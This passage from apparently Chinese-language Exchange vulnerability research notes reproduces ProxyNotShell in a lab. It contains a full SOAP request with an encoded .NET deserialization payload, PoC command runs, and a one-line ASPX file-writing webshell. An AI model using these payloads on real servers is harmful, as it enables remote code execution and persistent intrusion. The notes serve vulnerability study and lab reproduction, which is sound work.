                <a:ReplyTo>
                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
                <a:MessageID>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:MessageID>
                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
                <p:SessionId s:mustUnderstand="false">uuid:92d15a07-25ed-455c-913c-f75b789db485</p:SessionId>
                <p:OperationID s:mustUnderstand="false">uuid:86aa8b58-a678-4f53-a86b-c0ca5fde4238</p:OperationID>
                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
                <w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
                <w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
                        <w:Selector Name="ShellId">7ECF1934-4CC8-4322-B6C7-54FE32AFB3DC</w:Selector>
                </w:SelectorSet>
                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
        </s:Header>
        <s:Body>
        <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" CommandId="f09f9889-40ba-4a66-8b8f-be91c03e8376" >
                <rsp:Command>New-OfflineAddressBook</rsp:Command>
                <rsp:Arguments>AAAAAAAAAAMAAAAAAAAAAAMAAAZ6AgAAAAYQAgDw5UZdjgU/Qqbzjccy2sTUiZif8LpAZkqLj76RwD6DdjxPYmogUmVmSWQ9IjEzIj4KCQkJPFROIFJlZklkPSIwIj4KCQkJCTxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3Q8L1Q+CgkJCQk8VD5TeXN0ZW0uT2JqZWN0PC9UPgoJCQk8L1ROPgoJCQk8TVM+CgkJCQk8UyBOPSJOIj4tSWRlbnRpdHk6PC9TPgoJCQkJCQkJCTwhLS1PYmplY3QgdHlwZSBzZWN0aW9uLS0+CgkJCQk8T2JqIE49IlYiIFJlZklkPSIxNCI+CgkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQk8VD5TeXN0ZW0uU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXI8L1Q+CgkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJPC9UTj4KCQkJCQk8VG9TdHJpbmc+U3lzdGVtLlNlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyPC9Ub1N0cmluZz4KCgkJCQkJPFByb3BzPgoJCQkJCQk8UyBOPSJOYW1lIj5UeXBlPC9TPgoJCQkJCQk8T2JqIE49IlRhcmdldFR5cGVGb3JEZXNlcmlhbGl6YXRpb24iPgoJCQkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQkJCQk8VD5TeXN0ZW0uRXhjZXB0aW9uPC9UPgoJCQkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJCQk8L1ROPgoJCQkJCQkJPE1TPgoJCQkJCQkJCTxCQSBOPSJTZXJpYWxpemF0aW9uRGF0YSI+QUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFCOVRlWE4wWlcwdVZXNXBkSGxUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBUkVZWFJoQ1ZWdWFYUjVWSGx3WlF4QmMzTmxiV0pzZVU1aGJXVUJBQUVJQmdJQUFBQWdVM2x6ZEdWdExsZHBibVJ2ZDNNdVRXRnlhM1Z3TGxoaGJXeFNaV0ZrWlhJRUFBQUFCZ01BQUFCWVVISmxjMlZ1ZEdGMGFXOXVSbkpoYldWM2IzSnJMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OU16Rmlaak00TlRaaFpETTJOR1V6TlFzPTwvQkE+CgkJCQkJCQk8L01TPgoJCQkJCQk8L09iaj4KCQkJCQk8L1Byb3BzPgoKCQkJCQk8Uz4KICAgICAgICAgICAgICAgICAgICAgICAgPCFbQ0RBVEFbPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6U3lzdGVtPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIgeG1sbnM6RGlhZz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9c3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJMYXVuY2hDYWxjaCIgT2JqZWN0VHlwZT0ie3g6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lPSJTdGFydCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxTeXN0ZW06U3RyaW5nPmNtZC5leGU8L1N5c3RlbTpTdHJpbmc+PFN5c3RlbTpTdHJpbmc+L2MgbXNwYWludC5leGU8L1N5c3RlbTpTdHJpbmc+IDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+IDwvT2JqZWN0RGF0YVByb3ZpZGVyPiA8L1Jlc291cmNlRGljdGlvbmFyeT5dXT4KCQkJCQk8L1M+CgoJCQkJPC9PYmo+CgkJCTwvTVM+CgkJPC9PYmo+Cgk=</rsp:Arguments>
        </rsp:CommandLine>
</s:Body>
</s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: c3f52c2f-ada3-402f-b035-e837b53c40aa
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:28:40 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:28:39 GMT
Content-Length: 537

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:0CBC5ED1-668F-47AB-8CBD-895723CAFF63</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>F09F9889-40BA-4A66-8B8F-BE91C03E8376</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
```

### step4

攻击结束，移除SessionId，以便于再次利用漏洞

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: Email=autodiscover/admin@localhost
Content-Length: 1375

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:c3e774b7-9f83-485c-aeed-7b58740c958b</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">8FCEBA08-6309-4EA7-B742-738E3803F596</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body />
</s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 1d876b8a-ede2-4066-a9d6-b5d98c826528
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Wed, 08-Sep-1993 12:12:48 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 12:12:47 GMT
Content-Length: 452

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:FE680659-286C-4D5C-811B-2EB05B0A3D34</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
```

 - 本地成功测试exchange版本:

| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| python poc成功 but msf失败 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
| 测试失败 | Exchange Server 2019 累计更新 12 (KB5011156) 15.02.1118.007 | ExchangeServer2019-x64-CU12.ISO | 2022/4/20 | 5.8 GB |
| 测试失败 | Exchange Server 2016 累计更新 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| 测试失败 | Exchange Server 2013 累计更新 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |

需要后续修改poc脚本以适配各个版本exchange

## Janggggg 公开 ProxyNotShell PoC 本地测试

 - [Janggggg's github 公开 ProxyNotShell PoC](https://github.com/testanull/ProxyNotShell-PoC)

 - [twitter poc利用截图证明](https://twitter.com/wdormann/status/1593311129874403335?s=20&t=VlkAC7azYSOHl9MF4bOc3g)

1. 使用poc脚本启动notepad.exe

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' notepad.exe
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

 - ![](pics/proxynotshell.png)

 - ![](pics/proxynotshell1.png)

2. 使用poc脚本写入txt文本

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' "echo 'proxynotshell is here' > C:\proxynotshell.txt"
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

 - ![](pics/proxynotshell2.png)

3. 使用poc脚本启动cmd.exe

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' cmd.exe
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

 - ![](pics/proxynotshell3.png)

## Metasploit ProxyNotShell RCE exp 本地测试

11月17日，[ZeroSteiner](https://github.com/zeroSteiner)向MetaSploit分享了一个[pull请求](https://github.com/rapid7/metasploit-framework/pull/17275)，该请求提供了一种常见的方法来利用该漏洞，并且还提供了一个绕过[Exchange紧急缓解(EM)服务](https://learn.microsoft.com/en-us/exchange/exchange-emergency-mitigation-service?view=exchserver-2019)的方法，或微软推荐的IIS URL重写。此外，PR中还有对ProxyShell漏洞的更新。

 - [metasploit Microsoft Exchange ProxyNotShell RCE](https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxynotshell_rce/)

官方说仅支持Exchange Server 2019，可以使用CU12之前的未打补丁的exchange试试，本地暂无环境

 - ![](pics/proxynotshell4.png)
 - [exchange_proxynotshell_rce.rb](./exchange_proxynotshell_rce.rb)

需要后续修改metasploit proxynotshell rb脚本以适配各个版本exchange

# ProxyNotRelay
## ProxyNotRelay part links

 - [ProxyNotRelay - An Exchange Vulnerability](https://rw.md/2022/11/09/ProxyNotRelay.html)






# OWASSRF + TabShell
## OWASSRF + TabShell part links

 - [The OWASSRF + TabShell exploit chain](https://blog.viettelcybersecurity.com/tabshell-owassrf/)



# CVE-2022-23277
## CVE-2022-23277 part links

 - [DotNet安全-CVE-2022-23277漏洞复现](https://mp.weixin.qq.com/s/lrlZiVH3QZI3rMRZwk_l6A)
 - [《DotNet安全-CVE-2022-23277漏洞复现》涉及到的工具](https://github.com/7BitsTeam/CVE-2022-23277)

认证部分需要通过burpsuite手动添加，利用成功后会在aspnet_client写入1.aspx。

 - webshell:

``` bash
<%@ Page Language="JScript" Debug="true"%><%@Import Namespace="System.IO"%><%File.WriteAllBytes(Request["b"], Convert.FromBase64String(Request["a"]));%>
```

 - [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
 - [dotnet反序列化之并不安全的SerializationBinder](https://y4er.com/posts/dotnet-deserialize-bypass-binder/)
 - [2022 Exchange 再相遇之反序列化漏洞分析（二）](https://zhuanlan.zhihu.com/p/531190946)
 - [Deep understand ASPX file handling and some related attack vectors](https://blog.viettelcybersecurity.com/deep-understand-aspx-file-handling-and-some-related-attack-vector/)
 - [The journey of exploiting a Sharepoint vulnerability.](https://blog.viettelcybersecurity.com/the-journey-of-exploiting-a-sharepoint-vulnerability/)

# CVE-2023-21707
## CVE-2023-21707 part links

 - [Microsoft Exchange Powershell Remoting Deserialization leading to RCE (CVE-2023-21707)](https://starlabs.sg/blog/2023/04-microsoft-exchange-powershell-remoting-deserialization-leading-to-rce-cve-2023-21707/)
 - [Microsoft Exchange Powershell Remoting Deserialization lead to RCE (CVE-2023–21707)](https://testbnull.medium.com/microsoft-exchange-powershell-remoting-deserialization-lead-to-rce-cve-2023-21707-4d0e6d282f02)
 - [CVE-2023-21707 Exchange 反序列化payload生成](https://github.com/N1k0la-T/CVE-2023-21707/)
 - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)







# Research white paper PDFs

 - [Friday the 13th JSON Attacks](research-pdfs/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
 - [ProxyLogon is Just the Tip of the Iceberg](research-pdfs/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf)
 - [Are you my Type? - Breaking .NET Through Serialization](research-pdfs/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
 - [Pwn2Own 2021 Microsoft Exchange Exploit Chain 3rd Vulnerability doc](research-pdfs/pwn2own2021msexchange3rdvulnpdf.docx)
 - [高级攻防演练下的Webshell](https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf)
 - [Cracking the Lens: Targeting HTTP's Hidden Attack Surface](research-pdfs/research-pdfs/crackingthelens-whitepaper.pdf)
 - [DPAPI exploitation during pentest and password cracking](research-pdfs/DPAPI%20exploitation%20during%20pentest.pdf)
 - [How I Hacked Microsoft Teams and got $150,000 in Pwn2Own](research-pdfs/How%20I%20Hacked%20pwn2own2022.pdf)
 - [SCALEABLE HASH TABLE FOR SHARED MEMORY MULTIPROCESSOR SYSTEM](research-pdfs/SCALEABLE%20HASH.TABLE%20FOR%20SHARED.pdf)
 - [Vulnerability Exchange: One Domain Account for More Than Exchange Server RCE](research-pdfs/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf)
 - [File Operation Induced Unserialization via the "phar://" Stream Wrapper](research-pdfs/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
 - [Timeless Timing Attacks](research-pdfs/us-21-Timeless-Timing-Attacks.pdf)
 - [Practical Web Cache Poisoning: Redefining 'Unexploitable'](research-pdfs/web-cache-poisoning.pdf)
 - [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](research-pdfs/An%20ACE%20Up%20the%20Sleeve.pdf)


# offline address book

 - concept [Email addresses and address books in Exchange Server](https://learn.microsoft.com/en-us/exchange/email-addresses-and-address-books/email-addresses-and-address-books?view=exchserver-2019)
 - Design
 - [[MS-OXOAB]: Offline Address Book (OAB) File Format and Schema](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxoab/b4750386-66ec-4e69-abb6-208dd131c7de)
 - [[MS-OXWOAB]: Offline Address Book (OAB) Retrieval File Format](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxwoab/56ef97c8-641c-4cf6-b965-c0457cc50488)
 - [[MS-OXPFOAB]: Offline Address Book (OAB) Public Folder Retrieval Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxpfoab/258a07a7-34a7-4373-87c1-cddf51447d00)



# Low Level API (RPC)
 - [All protocols](./exchange-protocols/)
 - ![](./pics/protocols.png)
 - [A tool to abuse Exchange services](https://github.com/sensepost/ruler)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
 - [Exchange Server Protocol Documents](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83?source=recommendations)
 - [Export items by using EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-export-items-by-using-ews-in-exchange)
 - [Autodiscover for Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/autodiscover-for-exchange)
 - [[MS-OXCFXICS]: Bulk Data Transfer Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcfxics/b9752f3d-d50d-44b8-9e6b-608a117c8532)


# Other Links

 - [ProxyVulns](https://github.com/hosch3n/ProxyVulns)
 - [pax](https://github.com/liamg/pax)
 - [padre](https://github.com/glebarez/padre)
 - [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)
 - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 - [使用 ProxyShell 和 ProxyLogon 劫持邮件链](https://paper.seebug.org/1764/)
 - [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [后渗透/实验/Exchange](https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/Exchange.md)
